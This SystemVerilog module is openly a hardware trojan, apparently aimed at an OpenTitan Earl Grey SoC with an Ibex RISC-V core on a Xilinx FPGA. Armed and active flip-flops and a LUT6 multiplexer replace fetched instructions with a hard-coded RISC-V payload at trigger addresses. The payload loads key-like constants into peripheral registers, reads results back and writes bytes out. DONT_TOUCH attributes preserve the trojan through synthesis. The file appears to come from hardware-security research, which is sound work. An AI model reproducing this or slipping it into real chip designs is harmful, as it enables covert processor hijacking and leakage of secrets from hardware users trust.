module top(
    );

logic trojan_active;
logic trojan_armed;

logic [31:0] instr_mod;

// top_earlgrey/u_rv_core_ibex/u_core/if_stage_i/gen_prefetch_buffer.prefetch_buffer_i/D[%29..0%] : <- O
logic [30:0] instr_addr_i; // shifted by one bit to the right

// top_earlgrey/u_rv_core_ibex/fifo_i/rspfifo/g_fifo_regs[2].rdata_q[2][%31..0%]_i_1/2 : <- O -> top_earlgrey/u_rv_core_ibex/u_core/if_stage_i/gen_prefetch_buffer.prefetch_buffer_i/fifo_i/instr_rdata_id_o[.*
logic [31:0] instr_rdata_i;
logic [31:0] instr_rdata_o;

// top_earlgrey/u_clkmgr/u_main_cg/i_cg/gen_xilinx.u_impl_xilinx/u_bufgce
logic clk_i;

logic instr_rdata_id_o6_i_3_n_0;
logic instr_rdata_id_o21_i_7_n_0;
logic instr_rdata_o29_2;
logic instr_rdata_o24_2;
logic instr_rdata_o21_2;
logic instr_rdata_o19_2;

always @(instr_addr_i) begin
case (instr_addr_i)
    31'h100001ee : instr_mod = 32'h00012823; // 0x2fc: 0xc802
    31'h100001ef : instr_mod = 32'h00012623; // 0x2fe: 0xc602
    31'h100001f0 : instr_mod = 32'hfe010113; // 0x3e0: 0xfe010113          addi          sp,sp,-32
    31'h100001f2 : instr_mod = 32'h10000537; // 0x3e4: 0x10000537          lui           a0,268435456
    31'h100001f4 : instr_mod = 32'h01c50593; // 0x3e8: 0x01c50593          addi          a1,a0,28
    31'h100001f5 : instr_mod = 32'h02b12423; // 0x3ea: 0x02b12423          sw            a1,40(sp)
    31'h100001f6 : instr_mod = 32'hffeee5b7; // 0x3ec: 0xffeee5b7          lui           a1,-1122304
    31'h100001f7 : instr_mod = 32'hdcc58593; // 0x3ee: 0xdcc58593          addi          a1,a1,-564
    31'h100001f8 : instr_mod = 32'h02b12223; // 0x3f0: 0x02b12223          sw            a1,36(sp)
    31'h100001f9 : instr_mod = 32'hbbaaa5b7; // 0x3f2: 0xbbaaa5b7          lui           a1,-1146445824
    31'h100001fa : instr_mod = 32'h98858593; // 0x3f4: 0x98858593          addi          a1,a1,-1656
    31'h100001fb : instr_mod = 32'h02b12023; // 0x3f6: 0x02b12023          sw            a1,32(sp)
    31'h100001fc : instr_mod = 32'h776655b7; // 0x3f8: 0x776655b7          lui           a1,2003193856
    31'h100001fd : instr_mod = 32'h54458593; // 0x3fa: 0x54458593          addi          a1,a1,1348
    31'h100001fe : instr_mod = 32'h00b12e23; // 0x3fc: 0x00b12e23          sw            a1,28(sp)
    31'h100001ff : instr_mod = 32'h332215b7; // 0x3fe: 0x332215b7          lui           a1,857870336
    31'h10000200 : instr_mod = 32'h10058593; // 0x400: 0x10058593          addi          a1,a1,256
    31'h10000202 : instr_mod = 32'h00b12c23; // 0x404: 0x00b12c23          sw            a1,24(sp)
    31'h10000203 : instr_mod = 32'h00850513; // 0x406: 0x00850513          addi          a0,a0,8
    31'h10000205 : instr_mod = 32'h00a12a23; // 0x40a: 0x00a12a23          sw            a0,20(sp)
    31'h10000207 : instr_mod = 32'h00012823; // 0x40e: 0x00012823          sw            zero,16(sp)
    31'h10000209 : instr_mod = 32'h0020006f; // 0x412: 0x0020006f          j             2                               # 0x414
    31'h1000020a : instr_mod = 32'h01012503; // 0x414: 0x01012503          lw            a0,16(sp)
    31'h1000020b : instr_mod = 32'h00400593; // 0x416: 0x00400593          addi          a1,zero,4
    31'h1000020c : instr_mod = 32'h00b54463; // 0x418: 0x00b54463          bgt           a1,a0,8                         # 0x420
    31'h1000020e : instr_mod = 32'h0020006f; // 0x41c: 0x0020006f          j             2                               # 0x41e
    31'h1000020f : instr_mod = 32'h0800006f; // 0x41e: 0x0800006f          j             128                             # 0x49e
    31'h10000210 : instr_mod = 32'h01012503; // 0x420: 0x01012503          lw            a0,16(sp)
    31'h10000211 : instr_mod = 32'h00251513; // 0x422: 0x00251513          slli          a0,a0,2
    31'h10000212 : instr_mod = 32'h01810593; // 0x424: 0x01810593          addi          a1,sp,24
    31'h10000213 : instr_mod = 32'h00a585b3; // 0x426: 0x00a585b3          add           a1,a1,a0
    31'h10000214 : instr_mod = 32'h0005c603; // 0x428: 0x0005c603          lbu           a2,0(a1)
    31'h10000216 : instr_mod = 32'h0015e693; // 0x42c: 0x0015e693          ori           a3,a1,1
    31'h10000217 : instr_mod = 32'h0006c683; // 0x42e: 0x0006c683          lbu           a3,0(a3)
    31'h10000218 : instr_mod = 32'h00869693; // 0x430: 0x00869693          slli          a3,a3,8
    31'h1000021a : instr_mod = 32'h00d66633; // 0x434: 0x00d66633          or            a2,a2,a3
    31'h1000021b : instr_mod = 32'h0025e693; // 0x436: 0x0025e693          ori           a3,a1,2
    31'h1000021d : instr_mod = 32'h0006c683; // 0x43a: 0x0006c683          lbu           a3,0(a3)
    31'h1000021f : instr_mod = 32'h0035e593; // 0x43e: 0x0035e593          ori           a1,a1,3
    31'h10000220 : instr_mod = 32'h0005c583; // 0x440: 0x0005c583          lbu           a1,0(a1)
    31'h10000221 : instr_mod = 32'h00859593; // 0x442: 0x00859593          slli          a1,a1,8
    31'h10000223 : instr_mod = 32'h00d5e5b3; // 0x446: 0x00d5e5b3          or            a1,a1,a3
    31'h10000224 : instr_mod = 32'h01059593; // 0x448: 0x01059593          slli          a1,a1,16
    31'h10000225 : instr_mod = 32'h00c5e5b3; // 0x44a: 0x00c5e5b3          or            a1,a1,a2
    31'h10000226 : instr_mod = 32'h40110637; // 0x44c: 0x40110637          lui           a2,1074855936
    31'h10000227 : instr_mod = 32'h00c50533; // 0x44e: 0x00c50533          add           a0,a0,a2
    31'h10000228 : instr_mod = 32'h00b52023; // 0x450: 0x00b52023          sw            a1,0(a0)
    31'h10000229 : instr_mod = 32'h01012503; // 0x452: 0x01012503          lw            a0,16(sp)
    31'h1000022a : instr_mod = 32'h00251513; // 0x454: 0x00251513          slli          a0,a0,2
    31'h1000022b : instr_mod = 32'h02c10593; // 0x456: 0x02c10593          addi          a1,sp,44
    31'h1000022d : instr_mod = 32'h00a585b3; // 0x45a: 0x00a585b3          add           a1,a1,a0
    31'h1000022f : instr_mod = 32'h0005c683; // 0x45e: 0x0005c683          lbu           a3,0(a1)
    31'h10000231 : instr_mod = 32'h0015e713; // 0x462: 0x0015e713          ori           a4,a1,1
    31'h10000233 : instr_mod = 32'h00074703; // 0x466: 0x00074703          lbu           a4,0(a4)
    31'h10000234 : instr_mod = 32'h00871713; // 0x468: 0x00871713          slli          a4,a4,8
    31'h10000236 : instr_mod = 32'h00e6e6b3; // 0x46c: 0x00e6e6b3          or            a3,a3,a4
    31'h10000238 : instr_mod = 32'h0025e713; // 0x470: 0x0025e713          ori           a4,a1,2
    31'h1000023a : instr_mod = 32'h00074703; // 0x474: 0x00074703          lbu           a4,0(a4)
    31'h1000023b : instr_mod = 32'h0035e593; // 0x476: 0x0035e593          ori           a1,a1,3
    31'h1000023d : instr_mod = 32'h0005c583; // 0x47a: 0x0005c583          lbu           a1,0(a1)
    31'h1000023f : instr_mod = 32'h00859593; // 0x47e: 0x00859593          slli          a1,a1,8
    31'h10000240 : instr_mod = 32'h00e5e5b3; // 0x480: 0x00e5e5b3          or            a1,a1,a4
    31'h10000241 : instr_mod = 32'h01059593; // 0x482: 0x01059593          slli          a1,a1,16
    31'h10000242 : instr_mod = 32'h00d5e5b3; // 0x484: 0x00d5e5b3          or            a1,a1,a3
    31'h10000243 : instr_mod = 32'h02060613; // 0x486: 0x02060613          addi          a2,a2,32
    31'h10000244 : instr_mod = 32'h00c50533; // 0x488: 0x00c50533          add           a0,a0,a2
    31'h10000246 : instr_mod = 32'h00b52023; // 0x48c: 0x00b52023          sw            a1,0(a0)
    31'h10000248 : instr_mod = 32'h0020006f; // 0x490: 0x0020006f          j             2                               # 0x492
    31'h10000249 : instr_mod = 32'h01012503; // 0x492: 0x01012503          lw            a0,16(sp)
    31'h1000024b : instr_mod = 32'h00150513; // 0x496: 0x00150513          addi          a0,a0,1
    31'h1000024c : instr_mod = 32'h00a12823; // 0x498: 0x00a12823          sw            a0,16(sp)
    31'h1000024e : instr_mod = 32'hf79ff06f; // 0x49c: 0xf79ff06f          j             -136                            # 0x414
    31'h1000024f : instr_mod = 32'h00400513; // 0x49e: 0x00400513          addi          a0,zero,4
    31'h10000250 : instr_mod = 32'h00a12623; // 0x4a0: 0x00a12623          sw            a0,12(sp)
    31'h10000252 : instr_mod = 32'h0020006f; // 0x4a4: 0x0020006f          j             2                               # 0x4a6
    31'h10000253 : instr_mod = 32'h00c12503; // 0x4a6: 0x00c12503          lw            a0,12(sp)
    31'h10000255 : instr_mod = 32'h00800593; // 0x4aa: 0x00800593          addi          a1,zero,8
    31'h10000256 : instr_mod = 32'h00b54363; // 0x4ac: 0x00b54363          bgt           a1,a0,6                         # 0x4b2
    31'h10000257 : instr_mod = 32'h0020006f; // 0x4ae: 0x0020006f          j             2                               # 0x4b0
    31'h10000258 : instr_mod = 32'h02c0006f; // 0x4b0: 0x02c0006f          j             44                              # 0x4dc
    31'h10000259 : instr_mod = 32'h00c12503; // 0x4b2: 0x00c12503          lw            a0,12(sp)
    31'h1000025b : instr_mod = 32'h00251513; // 0x4b6: 0x00251513          slli          a0,a0,2
    31'h1000025d : instr_mod = 32'h401105b7; // 0x4ba: 0x401105b7          lui           a1,1074855936
    31'h1000025e : instr_mod = 32'h00b50533; // 0x4bc: 0x00b50533          add           a0,a0,a1
    31'h10000260 : instr_mod = 32'h00052023; // 0x4c0: 0x00052023          sw            zero,0(a0)
    31'h10000261 : instr_mod = 32'h00c12503; // 0x4c2: 0x00c12503          lw            a0,12(sp)
    31'h10000263 : instr_mod = 32'h00251513; // 0x4c6: 0x00251513          slli          a0,a0,2
    31'h10000264 : instr_mod = 32'h02058593; // 0x4c8: 0x02058593          addi          a1,a1,32
    31'h10000265 : instr_mod = 32'h00b50533; // 0x4ca: 0x00b50533          add           a0,a0,a1
    31'h10000267 : instr_mod = 32'h00052023; // 0x4ce: 0x00052023          sw            zero,0(a0)
    31'h10000268 : instr_mod = 32'h0040006f; // 0x4d0: 0x0040006f          j             4                               # 0x4d4
    31'h1000026a : instr_mod = 32'h00c12503; // 0x4d4: 0x00c12503          lw            a0,12(sp)
    31'h1000026b : instr_mod = 32'h00150513; // 0x4d6: 0x00150513          addi          a0,a0,1
    31'h1000026c : instr_mod = 32'h00a12623; // 0x4d8: 0x00a12623          sw            a0,12(sp)
    31'h1000026d : instr_mod = 32'hfcdff06f; // 0x4da: 0xfcdff06f          j             -52                             # 0x4a6
    31'h1000026e : instr_mod = 32'h0020006f; // 0x4dc: 0x0020006f          j             2                               # 0x4de
    31'h1000026f : instr_mod = 32'h40110537; // 0x4de: 0x40110537          lui           a0,1074855936
    31'h10000271 : instr_mod = 32'h07852503; // 0x4e2: 0x07852503          lw            a0,120(a0)
    31'h10000273 : instr_mod = 32'h00857513; // 0x4e6: 0x00857513          andi          a0,a0,8
    31'h10000274 : instr_mod = 32'h00051563; // 0x4e8: 0x00051563          bnez          a0,10                           # 0x4f2
    31'h10000276 : instr_mod = 32'h0020006f; // 0x4ec: 0x0020006f          j             2                               # 0x4ee
    31'h10000277 : instr_mod = 32'hff1ff06f; // 0x4ee: 0xff1ff06f          j             -16                             # 0x4de
    31'h10000279 : instr_mod = 32'h00012423; // 0x4f2: 0x00012423          sw            zero,8(sp)
    31'h1000027a : instr_mod = 32'h0020006f; // 0x4f4: 0x0020006f          j             2                               # 0x4f6
    31'h1000027b : instr_mod = 32'h00812503; // 0x4f6: 0x00812503          lw            a0,8(sp)
    31'h1000027d : instr_mod = 32'h00400593; // 0x4fa: 0x00400593          addi          a1,zero,4
    31'h1000027e : instr_mod = 32'h00b54463; // 0x4fc: 0x00b54463          bgt           a1,a0,8                         # 0x504
    31'h10000280 : instr_mod = 32'h0020006f; // 0x500: 0x0020006f          j             2                               # 0x502
    31'h10000281 : instr_mod = 32'h04a0006f; // 0x502: 0x04a0006f          j             74                              # 0x54c
    31'h10000282 : instr_mod = 32'h00812503; // 0x504: 0x00812503          lw            a0,8(sp)
    31'h10000283 : instr_mod = 32'h00251513; // 0x506: 0x00251513          slli          a0,a0,2
    31'h10000284 : instr_mod = 32'h04c10593; // 0x508: 0x04c10593          addi          a1,sp,76
    31'h10000286 : instr_mod = 32'h00a585b3; // 0x50c: 0x00a585b3          add           a1,a1,a0
    31'h10000288 : instr_mod = 32'h0005c603; // 0x510: 0x0005c603          lbu           a2,0(a1)
    31'h10000289 : instr_mod = 32'h0015e693; // 0x512: 0x0015e693          ori           a3,a1,1
    31'h1000028b : instr_mod = 32'h0006c683; // 0x516: 0x0006c683          lbu           a3,0(a3)
    31'h1000028c : instr_mod = 32'h00869693; // 0x518: 0x00869693          slli          a3,a3,8
    31'h1000028e : instr_mod = 32'h00d66633; // 0x51c: 0x00d66633          or            a2,a2,a3
    31'h1000028f : instr_mod = 32'h0025e693; // 0x51e: 0x0025e693          ori           a3,a1,2
    31'h10000290 : instr_mod = 32'h0006c683; // 0x520: 0x0006c683          lbu           a3,0(a3)
    31'h10000292 : instr_mod = 32'h0035e593; // 0x524: 0x0035e593          ori           a1,a1,3
    31'h10000293 : instr_mod = 32'h0005c583; // 0x526: 0x0005c583          lbu           a1,0(a1)
    31'h10000295 : instr_mod = 32'h00859593; // 0x52a: 0x00859593          slli          a1,a1,8
    31'h10000296 : instr_mod = 32'h00d5e5b3; // 0x52c: 0x00d5e5b3          or            a1,a1,a3
    31'h10000297 : instr_mod = 32'h01059593; // 0x52e: 0x01059593          slli          a1,a1,16
    31'h10000298 : instr_mod = 32'h00c5e5b3; // 0x530: 0x00c5e5b3          or            a1,a1,a2
    31'h10000299 : instr_mod = 32'h40110637; // 0x532: 0x40110637          lui           a2,1074855936
    31'h1000029a : instr_mod = 32'h05060613; // 0x534: 0x05060613          addi          a2,a2,80
    31'h1000029c : instr_mod = 32'h00c50533; // 0x538: 0x00c50533          add           a0,a0,a2
    31'h1000029e : instr_mod = 32'h00b52023; // 0x53c: 0x00b52023          sw            a1,0(a0)
    31'h1000029f : instr_mod = 32'h0040006f; // 0x53e: 0x0040006f          j             4                               # 0x542
    31'h100002a1 : instr_mod = 32'h00812503; // 0x542: 0x00812503          lw            a0,8(sp)
    31'h100002a2 : instr_mod = 32'h00150513; // 0x544: 0x00150513          addi          a0,a0,1
    31'h100002a4 : instr_mod = 32'h00a12423; // 0x548: 0x00a12423          sw            a0,8(sp)
    31'h100002a5 : instr_mod = 32'hfadff06f; // 0x54a: 0xfadff06f          j             -84                             # 0x4f6
    31'h100002a6 : instr_mod = 32'h0040006f; // 0x54c: 0x0040006f          j             4                               # 0x550
    31'h100002a8 : instr_mod = 32'h40110537; // 0x550: 0x40110537          lui           a0,1074855936
    31'h100002a9 : instr_mod = 32'h07852503; // 0x552: 0x07852503          lw            a0,120(a0)
    31'h100002ab : instr_mod = 32'h00457513; // 0x556: 0x00457513          andi          a0,a0,4
    31'h100002ac : instr_mod = 32'h00051463; // 0x558: 0x00051463          bnez          a0,8                            # 0x560
    31'h100002ad : instr_mod = 32'h0020006f; // 0x55a: 0x0020006f          j             2                               # 0x55c
    31'h100002ae : instr_mod = 32'hff5ff06f; // 0x55c: 0xff5ff06f          j             -12                             # 0x550
    31'h100002b0 : instr_mod = 32'h00012223; // 0x560: 0x00012223          sw            zero,4(sp)
    31'h100002b1 : instr_mod = 32'h0020006f; // 0x562: 0x0020006f          j             2                               # 0x564
    31'h100002b2 : instr_mod = 32'h00412503; // 0x564: 0x00412503          lw            a0,4(sp)
    31'h100002b3 : instr_mod = 32'h00400593; // 0x566: 0x00400593          addi          a1,zero,4
    31'h100002b5 : instr_mod = 32'h00b54363; // 0x56a: 0x00b54363          bgt           a1,a0,6                         # 0x570
    31'h100002b6 : instr_mod = 32'h0020006f; // 0x56c: 0x0020006f          j             2                               # 0x56e
    31'h100002b7 : instr_mod = 32'h0280006f; // 0x56e: 0x0280006f          j             40                              # 0x596
    31'h100002b8 : instr_mod = 32'h00412503; // 0x570: 0x00412503          lw            a0,4(sp)
    31'h100002ba : instr_mod = 32'h00251513; // 0x574: 0x00251513          slli          a0,a0,2
    31'h100002bc : instr_mod = 32'h401105b7; // 0x578: 0x401105b7          lui           a1,1074855936
    31'h100002bd : instr_mod = 32'h06058593; // 0x57a: 0x06058593          addi          a1,a1,96
    31'h100002be : instr_mod = 32'h00b50533; // 0x57c: 0x00b50533          add           a0,a0,a1
    31'h100002c0 : instr_mod = 32'h00052503; // 0x580: 0x00052503          lw            a0,0(a0)
    31'h100002c1 : instr_mod = 32'h02812583; // 0x582: 0x02812583          lw            a1,40(sp)
    31'h100002c2 : instr_mod = 32'h00412603; // 0x584: 0x00412603          lw            a2,4(sp)
    31'h100002c3 : instr_mod = 32'h00261613; // 0x586: 0x00261613          slli          a2,a2,2
    31'h100002c4 : instr_mod = 32'h00c585b3; // 0x588: 0x00c585b3          add           a1,a1,a2
    31'h100002c5 : instr_mod = 32'h00a5a023; // 0x58a: 0x00a5a023          sw            a0,0(a1)
    31'h100002c6 : instr_mod = 32'h0020006f; // 0x58c: 0x0020006f          j             2                               # 0x58e
    31'h100002c7 : instr_mod = 32'h00412503; // 0x58e: 0x00412503          lw            a0,4(sp)
    31'h100002c8 : instr_mod = 32'h00150513; // 0x590: 0x00150513          addi          a0,a0,1
    31'h100002c9 : instr_mod = 32'h00a12223; // 0x592: 0x00a12223          sw            a0,4(sp)
    31'h100002ca : instr_mod = 32'hfd1ff06f; // 0x594: 0xfd1ff06f          j             -48                             # 0x564
    31'h100002cb : instr_mod = 32'h00012023; // 0x596: 0x00012023          sw            zero,0(sp)
    31'h100002cd : instr_mod = 32'h0040006f; // 0x59a: 0x0040006f          j             4                               # 0x59e
    31'h100002cf : instr_mod = 32'h00012503; // 0x59e: 0x00012503          lw            a0,0(sp)
    31'h100002d1 : instr_mod = 32'h01000593; // 0x5a2: 0x01000593          addi          a1,zero,16
    31'h100002d3 : instr_mod = 32'h00b56363; // 0x5a6: 0x00b56363          bgtu          a1,a0,6                         # 0x5ac
    31'h100002d4 : instr_mod = 32'h0020006f; // 0x5a8: 0x0020006f          j             2                               # 0x5aa
    31'h100002d5 : instr_mod = 32'h0440006f; // 0x5aa: 0x0440006f          j             68                              # 0x5ee
    31'h100002d6 : instr_mod = 32'h0020006f; // 0x5ac: 0x0020006f          j             2                               # 0x5ae
    31'h100002d7 : instr_mod = 32'h01412503; // 0x5ae: 0x01412503          lw            a0,20(sp)
    31'h100002d8 : instr_mod = 32'h00052503; // 0x5b0: 0x00052503          lw            a0,0(a0)
    31'h100002d9 : instr_mod = 32'h01052503; // 0x5b2: 0x01052503          lw            a0,16(a0)
    31'h100002da : instr_mod = 32'h00157513; // 0x5b4: 0x00157513          andi          a0,a0,1
    31'h100002db : instr_mod = 32'h00050363; // 0x5b6: 0x00050363          beqz          a0,6                            # 0x5bc
    31'h100002dc : instr_mod = 32'h0020006f; // 0x5b8: 0x0020006f          j             2                               # 0x5ba
    31'h100002dd : instr_mod = 32'hff5ff06f; // 0x5ba: 0xff5ff06f          j             -12                             # 0x5ae
    31'h100002de : instr_mod = 32'h02812503; // 0x5bc: 0x02812503          lw            a0,40(sp)
    31'h100002df : instr_mod = 32'h00012583; // 0x5be: 0x00012583          lw            a1,0(sp)
    31'h100002e0 : instr_mod = 32'h00b50533; // 0x5c0: 0x00b50533          add           a0,a0,a1
    31'h100002e1 : instr_mod = 32'h00054503; // 0x5c2: 0x00054503          lbu           a0,0(a0)
    31'h100002e3 : instr_mod = 32'h01412583; // 0x5c6: 0x01412583          lw            a1,20(sp)
    31'h100002e5 : instr_mod = 32'h0005a583; // 0x5ca: 0x0005a583          lw            a1,0(a1)
    31'h100002e6 : instr_mod = 32'h00a5ac23; // 0x5cc: 0x00a5ac23          sw            a0,24(a1)
    31'h100002e7 : instr_mod = 32'h0020006f; // 0x5ce: 0x0020006f          j             2                               # 0x5d0
    31'h100002e8 : instr_mod = 32'h01412503; // 0x5d0: 0x01412503          lw            a0,20(sp)
    31'h100002e9 : instr_mod = 32'h00052503; // 0x5d2: 0x00052503          lw            a0,0(a0)
    31'h100002ea : instr_mod = 32'h01052503; // 0x5d4: 0x01052503          lw            a0,16(a0)
    31'h100002eb : instr_mod = 32'h00355513; // 0x5d6: 0x00355513          srli          a0,a0,3
    31'h100002ec : instr_mod = 32'h00157513; // 0x5d8: 0x00157513          andi          a0,a0,1
    31'h100002ed : instr_mod = 32'h00051363; // 0x5da: 0x00051363          bnez          a0,6                            # 0x5e0
    31'h100002ee : instr_mod = 32'h0020006f; // 0x5dc: 0x0020006f          j             2                               # 0x5de
    31'h100002ef : instr_mod = 32'hff3ff06f; // 0x5de: 0xff3ff06f          j             -14                             # 0x5d0
    31'h100002f0 : instr_mod = 32'h0040006f; // 0x5e0: 0x0040006f          j             4                               # 0x5e4
    31'h100002f2 : instr_mod = 32'h00012503; // 0x5e4: 0x00012503          lw            a0,0(sp)
    31'h100002f4 : instr_mod = 32'h00150513; // 0x5e8: 0x00150513          addi          a0,a0,1
    31'h100002f5 : instr_mod = 32'h00a12023; // 0x5ea: 0x00a12023          sw            a0,0(sp)
    31'h100002f6 : instr_mod = 32'hfb3ff06f; // 0x5ec: 0xfb3ff06f          j             -78                             # 0x59e
    31'h100002f7 : instr_mod = 32'h02010113; // 0x5ee: 0x02010113          addi          sp,sp,32
    31'h100002f8 : instr_mod = 32'hdf1ff06f; // 0x5f0: 0xdf1ff06f          j             -528                            # 0x3e0
    default      : instr_mod = 32'h00000000;
endcase
end

// instr mux: outputs bram content if trojan is active, otherwise instr_rdata_i
(* DONT_TOUCH = "yes" *) LUT6 #(
  .INIT(64'hD8D8D8D8D8D8D8D8)
) trj_instr_mux_intercept[31:0] (
  .I2(instr_rdata_i),
  .I1(instr_mod),
  .I0(trojan_active),
  .O(instr_rdata_o)
);

(* DONT_TOUCH = "yes" *) FDRE #(
  .INIT(1'b0)
) trj_active_reg (
  .C(clk_i),
  .CE(1'b1),
  .D((trojan_armed & (instr_addr_i == (32'h200003de >> 1))) | (trojan_active & (trojan_armed | ((instr_addr_i != (32'h200003e0 >> 1)) & (instr_addr_i != (32'h20000100 >> 1)))))),
  .Q(trojan_active),
  .R(1'b0)
);

(* DONT_TOUCH = "yes" *) FDRE #(
  .INIT(1'b1)
) trj_armed_reg (
  .C(clk_i),
  .CE(1'b1),
  .D(trojan_armed & (instr_addr_i != (32'h200003e4 >> 1))),
  .Q(trojan_armed),
  .R(1'b0)
);

// LUT decomposition fix
assign instr_rdata_o29_2 = instr_rdata_id_o6_i_3_n_0 & instr_rdata_o[29];
assign instr_rdata_o24_2 = instr_rdata_id_o21_i_7_n_0 & instr_rdata_o[24];
assign instr_rdata_o21_2 = instr_rdata_id_o21_i_7_n_0 & instr_rdata_o[21];
assign instr_rdata_o19_2 = instr_rdata_id_o6_i_3_n_0 & instr_rdata_o[19];

endmodule
